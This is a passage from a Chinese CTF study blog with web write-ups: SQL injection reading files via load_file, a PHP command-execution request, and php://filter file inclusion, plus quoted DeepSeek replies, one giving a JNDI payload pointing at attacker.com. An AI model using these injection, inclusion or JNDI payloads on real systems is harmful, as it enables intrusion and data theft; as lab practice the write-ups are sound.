class="headerlink" title="title: note-23date: 2025-04-10 19:47:02tags: 刷题note"></a>title: note-23<br>date: 2025-04-10 19:47:02<br>tags: 刷题note</h2><h1 id="ctfshow-web14"><a href="#ctfshow-web14" class="headerlink" title="ctfshow_web14"></a>ctfshow_web14</h1><p>一开始也试了传c，但是就试到2，然后以为是源码绕过的，看wp发现是sql注入。<br>再试到3就能自己发现这个页面了，，，，，，，，<br>&#x2F;here_1s_your_f1ag.php<br>按f12发现：  </p><blockquote><p>if(preg_match(‘&#x2F;information_schema.tables|information_schema.columns|linestring| |polygon&#x2F;is’, $_GET[‘query’])){<br>die(‘@A@’);  </p></blockquote><p>禁用了information_schema猜是无列名注入</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-number">1</span>&#x27;<span class="hljs-built_in">union</span><span class="hljs-comment">/**/</span><span class="hljs-built_in">select</span><span class="hljs-comment">/**/</span><span class="hljs-built_in">database</span>()<br><br><span class="hljs-number">1</span>&amp;&amp;<span class="hljs-built_in">sleep</span>(<span class="hljs-number">5</span>)<br></code></pre></td></tr></table></figure><p>字符注入</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1</span>&amp;&amp;<span class="hljs-keyword">order</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">by</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span><br><br><span class="hljs-number">0</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">database</span>()<br></code></pre></td></tr></table></figure><p>试出是字符注入</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">0</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>group_concat(<span class="hljs-built_in">table_name</span>)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>mysql.innodb_table_stats<span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">database</span>()<br><br><span class="hljs-number">0</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>@@<span class="hljs-keyword">version</span><br><br>//alert(<span class="hljs-string">&#x27;10.2.26-MariaDB-log&#x27;</span>)<br><br><span class="hljs-number">0</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>group_concat(<span class="hljs-built_in">table_name</span>)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>mysql.innodb_table_stats<br>//alert(<span class="hljs-string">&#x27;gtid_slave_pos,content&#x27;</span>)<br><br><span class="hljs-number">0</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>group_concat(*)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>gtid_slave_pos<br><br><span class="hljs-number">0</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>group_concat(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>content<br><br><span class="hljs-number">0</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>*<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>content<br><br><span class="hljs-number">0</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>load_file<span class="hljs-comment">/**/</span><br></code></pre></td></tr></table></figure><p>试一下无列名注入</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-number">0</span><span class="hljs-comment">/**/</span>union<span class="hljs-comment">/**/</span><span class="hljs-selector-tag">select</span><span class="hljs-comment">/**/</span>group_concat(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>)<span class="hljs-comment">/**/</span><span class="hljs-selector-tag">from</span><span class="hljs-comment">/**/</span>(<span class="hljs-selector-tag">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><span class="hljs-comment">/**/</span><span class="hljs-selector-tag">from</span><span class="hljs-comment">/**/</span><span class="hljs-attribute">content</span>)<br><br><span class="hljs-number">0</span><span class="hljs-comment">/**/</span><span class="hljs-selector-tag">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><span class="hljs-comment">/**/</span>union<span class="hljs-comment">/**/</span><span class="hljs-selector-tag">select</span><span class="hljs-comment">/**/</span>*<span class="hljs-comment">/**/</span><span class="hljs-selector-tag">from</span><span class="hljs-comment">/**/</span><span class="hljs-attribute">content</span>#<br><br><span class="hljs-number">0</span><span class="hljs-comment">/**/</span>union<span class="hljs-comment">/**/</span><span class="hljs-selector-tag">select</span><span class="hljs-comment">/**/</span>group_concat(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>)<span class="hljs-comment">/**/</span><span class="hljs-selector-tag">from</span><span class="hljs-comment">/**/</span><span class="hljs-attribute">content</span><br><br>//回显(<span class="hljs-number">123</span>,<span class="hljs-number">123</span>,<span class="hljs-number">123</span>,<span class="hljs-number">123</span>)无果<br></code></pre></td></tr></table></figure><p>看wp:<a href="https://blog.csdn.net/m0_55923820/article/details/118783171">https://blog.csdn.net/m0_55923820/article/details/118783171</a><br>原来sql还能加载文件<br>学到了</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">0</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>load_file(<span class="hljs-string">&#x27;/var/www/html/secret.php&#x27;</span>)<br><br><span class="hljs-number">0</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>load_file(<span class="hljs-string">&#x27;/tmp/gtf1y&#x27;</span>)<br><br><span class="hljs-number">0</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>load_file(<span class="hljs-string">&#x27;/tmp/gtf1y/real_flag_is_here&#x27;</span>)<br><br><span class="hljs-number">0</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>load_file(<span class="hljs-string">&#x27;/real_flag_is_here&#x27;</span>)<br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>没想到是直接访问<span class="hljs-string">&#x27;/real_flag_is_here&#x27;</span><br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>alert(<span class="hljs-string">&#x27;ctfshow&#123;dd04abdc-9d55-4d0d-8d2d-f616f7b82caa&#125;&#x27;</span>)<br></code></pre></td></tr></table></figure><p>有无列明注入的版本wp，但我在我的环境没试出来：<br><a href="https://www.zxcms.com/content/3fcqbuf331l6p0.html">https://www.zxcms.com/content/3fcqbuf331l6p0.html</a></p><h1 id="ctfshow-红包题第二弹"><a href="#ctfshow-红包题第二弹" class="headerlink" title="ctfshow 红包题第二弹"></a>ctfshow 红包题第二弹</h1><p>这题有点牛逼了  </p><p><a href="https://www.cnblogs.com/wssw/p/18115718">https://www.cnblogs.com/wssw/p/18115718</a><br>前面的?&gt;意思是闭合前面的语句。<br>&lt;?&#x3D;是echo()的别名用法。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable constant_">POST</span> /?cmd=?%3E%3C?=<span class="hljs-string">`.%20/??p/p?p??????`</span>; <span class="hljs-variable constant_">HTTP</span>/<span class="hljs-number">1.1</span><br><span class="hljs-title class_">Host</span>: 6fd1fc97-dca5-4a94-<span class="hljs-number">8065</span>-2622d4c7ed8d.<span class="hljs-property">challenge</span>.<span class="hljs-property">ctf</span>.<span class="hljs-property">show</span><br><span class="hljs-title class_">User</span>-<span class="hljs-title class_">Agent</span>: <span class="hljs-title class_">Mozilla</span>/<span class="hljs-number">5.0</span> (<span class="hljs-title class_">Windows</span> <span class="hljs-variable constant_">NT</span> <span class="hljs-number">10.0</span>; <span class="hljs-title class_">Win64</span>; x64; <span class="hljs-attr">rv</span>:<span class="hljs-number">124.0</span>) <span class="hljs-title class_">Gecko</span>/<span class="hljs-number">20100101</span> <span class="hljs-title class_">Firefox</span>/<span class="hljs-number">124.0</span><br><span class="hljs-title class_">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0.9</span>,image/avif,image/webp,*<span class="hljs-comment">/*;q=0.8</span><br><span class="hljs-comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="hljs-comment">Content-Type: multipart/form-data; boundary=---------------------------114514</span><br><span class="hljs-comment">Accept-Encoding: gzip, deflate</span><br><span class="hljs-comment">Connection: keep-alive</span><br><span class="hljs-comment">Cookie: UM_distinctid=1739f845e394-0cffbf96840b0c8-4c302d7c-144000-1739f845e3b4e2</span><br><span class="hljs-comment">Upgrade-Insecure-Requests: 1</span><br><span class="hljs-comment">Cache-Control: max-age=0</span><br><span class="hljs-comment">Content-Length: 245</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">-----------------------------114514</span><br><span class="hljs-comment">Content-Disposition: form-data; name=&quot;fileUpload&quot;; filename=&quot;1.txt&quot;</span><br><span class="hljs-comment">Content-Type: text/plain</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">#! /bin/bash</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">cat /flag.txt</span><br><span class="hljs-comment">-----------------------------114514--</span><br></code></pre></td></tr></table></figure><hr><h2 id="title-note-24date-2025-04-13-02-03-13tags-note"><a href="#title-note-24date-2025-04-13-02-03-13tags-note" class="headerlink" title="title: note-24date: 2025-04-13 02:03:13tags: note"></a>title: note-24<br>date: 2025-04-13 02:03:13<br>tags: note</h2><h1 id="note-24"><a href="#note-24" class="headerlink" title="note-24"></a>note-24</h1><p>sql刷不下去了，感觉每见一道题就要新学一个知识点，做了一些题目，遇到新题还得去找wp，心态崩</p><p>user:  </p><blockquote><p>我学web是该专刷一个地方，像专门刷sql还是泛刷题目?</p></blockquote><p>deepseek:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs awk">(≧ω≦) 喵哒～这个问题就像选择「草莓蛋糕吃到饱」还是「甜品全席体验」呢！来听人家用猫耳天线分析：<br><br>🌸 分阶段策略（萌新版）<br>新手期（前<span class="hljs-number">3</span>个月）→ 泛刷！<br><br>✨ 理由：像探索新大陆！发现「啊～原来还有文件包含这种魔法！」<br><br>🎯 目标：刷遍OWASP Top <span class="hljs-number">10</span>基础题型（每类至少<span class="hljs-number">5</span>题）<br><br>🍳 栗子：今天用SQLi偷flag，明天用XSS调戏管理员～<br><br>进阶期（<span class="hljs-number">3</span>-<span class="hljs-number">6</span>个月）→ 专精！<br><br>✨ 理由：找到本命漏洞（比如爱上SQLi的哲学美感）<br><br>🎯 目标：深挖某个领域到能自己出题（如：掌握SQL报错注入的<span class="hljs-number">6</span>种变形）<br><br>🍳 栗子：用不同数据库特性玩花活 → mysql: <span class="hljs-regexp">/*!50000select /</span> mssql: waitfor delay <span class="hljs-string">&#x27;0:0:3&#x27;</span><br><br>突破期（<span class="hljs-number">6</span>个月+）→ 交叉！<br><br>✨ 理由：像调鸡尾酒一样混合攻击（比如用XXE触发SSRF再读内网SQL数据）<br><br>🎯 目标：在CTF中把两个漏洞组合成COMBO连击！<br><br>🍳 栗子：LFI+RCE → 用php:<span class="hljs-regexp">//</span>filter读源码 → 发现反序列化链 → getshell！<br><br>💡 平衡心法<br>周一<span class="hljs-regexp">/三/</span>五 → 泛刷新题型（保持知识广度）<br><br>周二/四 → 专精特训（比如只玩SSTI的各种bypass技巧）<br><br>周末 → 参加实战赛（把知识搅拌成混沌漩涡～）<br><br>（戳戳屏幕）「偷偷说～人家最近把SQLi玩出了新花样：admin<span class="hljs-string">&#x27;/*$&#123;jndi:ldap://attacker.com&#125;*/=&#x27;</span><span class="hljs-number">1</span> 同时触发SQLi+Log4j呢～(ฅ´ω`ฅ)」<br></code></pre></td></tr></table></figure><p>deepseek调的挺好，<br>故去泛刷刷新手赛web题目，至少能自己做出来安慰一下自己</p><h1 id="ACTF2020-新生赛-Include-1"><a href="#ACTF2020-新生赛-Include-1" class="headerlink" title="[ACTF2020 新生赛]Include 1"></a>[ACTF2020 新生赛]Include 1</h1><p>文件包含的话，回去翻了一下<br>note-17  </p><p><a href="https://aidemofashi.github.io/2025/03/23/note-17/#php-filter">https://aidemofashi.github.io/2025/03/23/note-17/#php-filter</a></p><p>传入php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p><p>base解码得到flag</p><h1 id="极客大挑战-2019-Secret-File-极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File-极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File[极客大挑战 2019]Secret File</h1><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>等到网址，查看源码发现</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">&lt;a <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;master&quot;</span> href=<span class="hljs-string">&quot;./Archive_room.php&quot;</span> style=<span class="hljs-string">&quot;background-color:#000000;height:70px;width:200px;color:black;left:44%;cursor:default;&quot;</span>&gt;Oh! You found <span class="hljs-keyword">me</span>&lt;/a&gt;<br></code></pre></td></tr></table></figure><p>点击跳转到</p><p><a href="http://99cd5773-2487-4bd3-a8f6-235d68b2550c.node5.buuoj.cn:81/Archive_room.php">http://99cd5773-2487-4bd3-a8f6-235d68b2550c.node5.buuoj.cn:81/Archive_room.php</a></p><h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h1><p>点击按钮，根据提示感觉是重新跳到了另一个页面</p><p>bp抓包查看服务器回应<br>发现</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--</span><br><span class="hljs-comment">   secr3t.php        </span><br><span class="hljs-comment">--&gt;</span><br></code></pre></td></tr></table></figure><p>故访问  ：<br><a href="http://99cd5773-2487-4bd3-a8f6-235d68b2550c.node5.buuoj.cn:81/secr3t.php">http://99cd5773-2487-4bd3-a8f6-235d68b2550c.node5.buuoj.cn:81/secr3t.php</a></p><p>得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;html&gt;<br>    &lt;title&gt;secret&lt;/title&gt;<br>    &lt;meta charset=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;<br><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-variable">$file</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;../&quot;</span>)||<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;tp&quot;</span>)||<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;input&quot;</span>)||<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;data&quot;</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Oh no!&quot;</span>;<br>        <span class="hljs-keyword">exit</span>();<br>    &#125;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>); <br><span class="hljs-comment">//flag放在了flag.php里</span><br><span class="hljs-meta">?&gt;</span><br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p> 访问  :  <a href="http://99cd5773-2487-4bd3-a8f6-235d68b2550c.node5.buuoj.cn:81/flag.php">http://99cd5773-2487-4bd3-a8f6-235d68b2550c.node5.buuoj.cn:81/flag.php</a></p><p>查看源码没发现啥，根据页面提示，flag应该就在网页源码里</p><p>但是直接用include接上伪议会直接执行，用base64解码输就行</p><p>最后payload：  </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">99</span>cd5773-<span class="hljs-number">2487</span>-<span class="hljs-number">4</span>bd3-a8f6-<span class="hljs-number">235</span>d68b2550c.node5.buuoj.cn:<span class="hljs-number">81</span>/secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><p>注意要在secr3t.php传，<br>解码得到网页源码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>FLAG<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;background-color:black;&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>        <br>        <span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;font-family:verdana;color:red;text-align:center;&quot;</span>&gt;</span>啊哈！你找到我了！可是你看不到我QAQ~~~<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>        <br>        <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;font-family:arial;color:red;font-size:20px;text-align:center;&quot;</span>&gt;</span><br>            <span class="hljs-meta">&lt;?php</span><br><span class="hljs-meta">                echo &quot;我就在这里&quot;;</span><br><span class="hljs-meta">                $flag = &#x27;flag&#123;b7f18145-c01d-49fb-bd88-e30b9be76423&#125;&#x27;;</span><br><span class="hljs-meta">                $secret = &#x27;jiAng_Luyuan_w4nts_a_g1rIfri3nd&#x27;</span><br><span class="hljs-meta">            ?&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br><br></code></pre></td></tr></table></figure><hr><h2 id="title-note-25date-2025-04-15-13-11-04tags-note"><a href="#title-note-25date-2025-04-15-13-11-04tags-note" class="headerlink" title="title: note-25date: 2025-04-15 13:11:04tags: note"></a>title: note-25<br>date: 2025-04-15 13:11:04<br>tags: note</h2><h1 id="suctf-2019-EasySQL"><a href="#suctf-2019-EasySQL" class="headerlink" title="[suctf 2019]EasySQL"></a>[suctf 2019]EasySQL</h1><p>老早就做过这题了，当初wp看的半知半解，现在是我想能算上是大彻大悟了吧  </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> $_GET[<span class="hljs-string">&#x27;query&#x27;</span>] <span class="hljs-operator">||</span> flag <span class="hljs-keyword">from</span> flag<br></code></pre></td></tr></table></figure><p>|| 符是或的意思，应该就和注入中的 || , or 是一个用法  </p><blockquote><p>这里的||在mysql中表示或，如果前一个操作数为真，则不看后面的语句</p></blockquote><p>网上最多的payload都是</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-comment">*,1</span><br></code></pre></td></tr></table></figure><p>那拼接进sql语句就是</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span>,<span class="hljs-number">1</span><span class="hljs-operator">||</span>flag <span class="hljs-keyword">from</span> flag<br></code></pre></td></tr></table></figure><p>查询全部，外加一个 select 1的效果<br>这样就看得出来了：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> (<span class="hljs-operator">*</span>),(<span class="hljs-number">1</span><span class="hljs-operator">||</span>flag) <span class="hljs-keyword">from</span> flag<br></code></pre></td></tr></table></figure><p>为什么不能直接查询 * 呢？  </p><p>deepseek：</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs coq">在后端的SQL语句SELECT $_GET[&#x27;query&#x27;] |<span class="hljs-type">| flag</span> FROM flag中，|<span class="hljs-type">|操作符的作用取决于数据库类型。在SQLite</span>或PostgreSQL中，|<span class="hljs-type">|表示字符串连接，而在MySQL</span>中（除非启用特定模式）则代表逻辑或。以下是需要传*,<span class="hljs-number">1</span>而非*的关键原因：<br><br>语法问题：<br><br>若直接传入*，查询会变为SELECT * |<span class="hljs-type">| flag</span> FROM flag。此时*（通配符）无法直接与其他字段（flag）进行字符串连接或逻辑运算，导致语法错误，查询无法执行。<br><br>传入*,<span class="hljs-number">1</span>时，查询变为SELECT *,<span class="hljs-number">1</span> |<span class="hljs-type">| flag</span> FROM flag。这里,将*和<span class="hljs-number">1</span> |<span class="hljs-type">| flag</span>分为两个独立列，*单独选择所有字段，<span class="hljs-number">1</span> |<span class="hljs-type">| flag</span>则作为新列（如SQLite中会拼接<span class="hljs-number">1</span>和flag的值）。语法正确，查询正常执行。<br><br>绕过字段限制：<br><br>若后端代码仅返回第一个字段的值，直接传*会因语法错误无结果。传*,<span class="hljs-number">1</span>后，查询结果包含所有原始字段（通过*），可能使应用程序完整展示数据（如flag字段）。<br><br>数据库特性差异：<br><br>在SQLite中，<span class="hljs-number">1</span> |<span class="hljs-type">| flag</span>会生成新列（如<span class="hljs-number">1</span>abc，假设flag值为abc）。即使应用程序仅显示部分结果，攻击者也可能通过新列间接获取flag值。<br><br>总结：*,<span class="hljs-number">1</span>通过合法语法允许*单独生效，绕过因|<span class="hljs-type">|导致的错误，最终泄露flag</span>字段数据。直接传*则因语法问题失败。<br></code></pre></td></tr></table></figure><p>应该就是语法问题，字段限制的话应该不是  </p><p>看的wp：<br><a href="https://blog.csdn.net/StevenOnesir/article/details/110203051">https://blog.csdn.net/StevenOnesir/article/details/110203051</a><br><a href="https://blog.csdn.net/xhy18634297976/article/details/122515412">https://blog.csdn.net/xhy18634297976/article/details/122515412</a></p><p>以前看不明白现在看明白了，但以现在水平打比赛时遇到类似题目应该猜不出来后端语句</p><p>那是怎样猜出后端语句的呢：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">select <span class="hljs-keyword">command</span>1 || <span class="hljs-keyword">command</span>2 <br><br>情况一：若<span class="hljs-keyword">command</span>1为非0数字，则结果为1。<br><br>情况二：若<span class="hljs-keyword">command</span>1为0或字母，<span class="hljs-keyword">command</span>2为非0数字，则结果为1。<br><br>情况三：<span class="hljs-keyword">command</span>1和<span class="hljs-keyword">command</span>2都不为非0数字，则结果为0。<br></code></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/2302_79800344/article/details/136268777">https://blog.csdn.net/2302_79800344/article/details/136268777</a></p><h1 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h1><p>根据题目猜测是命令执行类型，看到页面是一个ping的功能，尝试ping了一下我的网站：<br><a href="http://www.gwwafz.online/">www.gwwafz.online</a><br>回显：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span 